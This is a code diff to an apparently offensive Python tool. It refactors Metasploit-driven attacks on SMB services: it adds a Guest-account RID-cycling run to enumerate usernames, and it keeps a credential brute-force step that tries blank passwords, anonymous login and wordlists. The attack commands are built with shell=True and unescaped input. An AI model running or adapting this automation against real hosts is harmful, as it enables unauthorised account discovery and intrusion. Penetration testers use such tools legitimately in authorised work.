@@ -16,7 +16,25 @@ def export_wordlists():
         file.close()
 
 
+def rid_cycling(target, user, passw, domain):
+    cmd = f'msfconsole -q -x "use scanner/smb/smb_lookupsid;set rhosts {target};set MinRID 1000;set MaxRID 5000;set SMBUser {user};set SMBPass {passw};set THREADS 10;set SMBDomain {domain};run;exit;"'
+
+    try:
+        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+    except:
+        return
+
+    if output:
+        print_banner('445')
+        print('[!]', cmd)
+        print('[!] RID Cycling Attack to get Usernames')
+        print('')
+        print(output)
+
+
 def handle_smb(target):
+    rid_cycling(target, 'Guest', '', '.')
+
     cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set BLANK_PASSWORDS true;set ANONYMOUS_LOGIN true;set rhosts {target};set USER_AS_PASS true;set STOP_ON_SUCCESS true;set VERBOSE false;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;run;exit;"'
 
     export_wordlists()
@@ -61,18 +79,5 @@ def handle_smb(target):
                     print('')
                     print(output)
 
-                cmd = f'msfconsole -q -x "use scanner/smb/smb_lookupsid;set rhosts {target};set MinRID 1000;set MaxRID 5000;set SMBUser {user};set SMBPass {passw};set THREADS 10;set SMBDomain {domain};run;exit;"'
-
-                try:
-                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
-                except:
-                    return
-
-                if output:
-                    print_banner('445')
-                    print('[!]', cmd)
-                    print('[!] RID Cycling Attack to get Usernames')
-                    print('')
-                    print(output)
-                
+                rid_cycling(target, user, passw, domain)
                 break
